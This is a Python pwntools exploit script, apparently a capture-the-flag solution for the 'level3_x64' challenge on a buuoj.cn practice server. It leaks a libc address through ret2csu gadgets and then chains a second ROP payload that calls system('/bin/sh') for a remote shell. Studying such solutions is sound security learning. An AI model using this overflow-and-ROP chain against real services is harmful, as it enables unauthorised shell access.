from pwn import *
from LibcSearcher import *
context.arch='amd64'

# there isn't suitable gadget to leak address directly by call write
# but this program is 64bit, so we can use the universe gadgets to leak address

# p = process('./level3_x64')
p = remote('node3.buuoj.cn',28781)
elf = ELF('./level3_x64',checksec=False)
write_got = elf.got['write']
main = elf.sym['main']

gadget1 = 0x0000000000400690
# mov     rdx, r13
# mov     rsi, r14
# mov     edi, r15d
# call    qword ptr [r12+rbx*8]
# add     rbx, 1
# cmp     rbx, rbp
gadget2 = 0x00000000004006AA                 
# pop     rbx
# pop     rbp
# pop     r12
# pop     r13
# pop     r14
# pop     r15
ret_rdi = 0x00000000004006b3 
# pop rdi ; ret

payload = 'A'*(0x80+8)
payload += flat([
	gadget2,
	0, 1, write_got,
	8, write_got, 1,
	gadget1])

# notice: make the register r12 point to write@got(or other function), not the write@plt
# because the write@got is the real address of write's body

payload += '\x00'*56	# addjust the stack, the universe gadgets will change the regin stack location
payload += p64(main)

p.recvuntil('Input:\n')
p.send(payload)
sleep(3)

write_addr = u64(p.recv(8))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

payload = 'A'*(0x80+8)
payload += flat([ret_rdi, binsh, system_addr ,main])
p.recvuntil('Input:')
p.send(payload)
sleep(1)
p.interactive()
